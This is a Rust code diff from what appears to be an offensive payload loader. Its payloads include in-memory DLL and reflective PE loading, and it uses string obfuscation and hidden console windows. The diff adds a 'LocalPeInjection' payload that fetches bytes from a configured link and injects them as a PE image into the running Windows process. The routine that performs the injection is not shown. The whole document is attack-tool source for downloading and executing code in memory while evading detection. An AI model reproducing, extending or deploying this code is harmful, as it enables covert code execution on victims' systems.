@@ -27,6 +27,8 @@ use std::os::windows::process::CommandExt;
 #[cfg(target_os = "windows")]
 const CREATE_NO_WINDOW: u32 = 0x08000000;
 
+
+
 use anyhow::Result;
 use serde::{Deserialize, Serialize};
 use std::fs::File;
@@ -57,6 +59,7 @@ pub enum Payload {
     ExecPython(ExecPython),
     DllFromMemory(DllFromMemory),
     ReflectivePEFromMemory(ReflectivePEFromMemory),
+    LocalPeInjection(LocalPeInjection),
 }
 impl Payload {
     pub fn exec_payload(&self, config: &Config) -> PayloadExecThread {
@@ -68,6 +71,7 @@ impl Payload {
             Payload::ExecPython(payload) => payload.exec_python_with_embedder(),
             Payload::DllFromMemory(payload) => payload.dll_from_memory(config),
             Payload::ReflectivePEFromMemory(payload) => payload.reflective_pe_from_memory(config),
+            Payload::LocalPeInjection(payload) => payload.exec_local_pe_injection(config),
         };
 
         match exec_result {
@@ -118,6 +122,7 @@ impl Payload {
             Payload::ExecPython(payload) => payload.runonce,
             Payload::DllFromMemory(payload) => payload.runonce,
             Payload::ReflectivePEFromMemory(payload) => payload.runonce,
+            Payload::LocalPeInjection(payload) => payload.runonce,
         }
     }
 }
@@ -467,25 +472,62 @@ impl ReflectivePEFromMemory {
 }
 
 
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+pub enum CommandLine {
+    ArgParse(),
+    Txt(String),
+}
+
+/* 
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+pub enum PeType {
+    Dll(String),
+    Exe(),
+}
+*/
+
+#[cfg(target_os = "windows")]
+use std::env;
+#[cfg(target_os = "windows")]
+use crate::local_pe_injection::main::local_pe_injection;
+//#[cfg(target_os = "windows")]
+//use crate::local_pe_injection::cmd::Args;
+
 
 //info!("DEBUG local_pe_injection");
 //use crate::local_pe_injection;
 //local_pe_injection();
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct LocalPeInjection {
-    pub path: String, //path of python directory
-    pub python_code: String,
+    pub link: Link,
+    pub commandline: CommandLine,
+    pub dll_entrypoint: String,
     pub thread: bool,
     pub runonce: bool,
 }
 impl LocalPeInjection {
     #[cfg(target_os = "linux")]
-    pub fn exec_local_pe_injection(&self) -> Result<PayloadExecThread, anyhow::Error> {
-        fail_linux_message(format!("{}", encrypt_string!("ExecPython")));
+    pub fn exec_local_pe_injection(&self, _config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+        fail_linux_message(format!("{}", encrypt_string!("LocalPeInjection")));
         return Ok(PayloadExecThread::NoThread());
     }
 
     #[cfg(target_os = "windows")]
-    pub fn exec_local_pe_injection(&self) -> Result<PayloadExecThread, anyhow::Error> {
+    pub fn exec_local_pe_injection(&self, config: &Config) -> Result<PayloadExecThread, anyhow::Error> {
+        //let parsed_args = Wstunnel::parse_from(args);
+        // TODO args soit depuis CommandLine
+        //let args = Args::parse();Args
+        let args: Vec<String> = env::args().collect();
+        let args_ok: String = args.join(" ");
+
+        //
+        /*
+        let export = match self.pe_type.clone() {
+            PeType::Exe() => String::new(),
+            PeType::Dll(s) => s,
+        };*/
+        let data: Vec<u8> = self.link.fetch_data(config)?;
+        local_pe_injection(args_ok,self.dll_entrypoint.clone(),data);
+        return Ok(PayloadExecThread::NoThread());
     }
 }
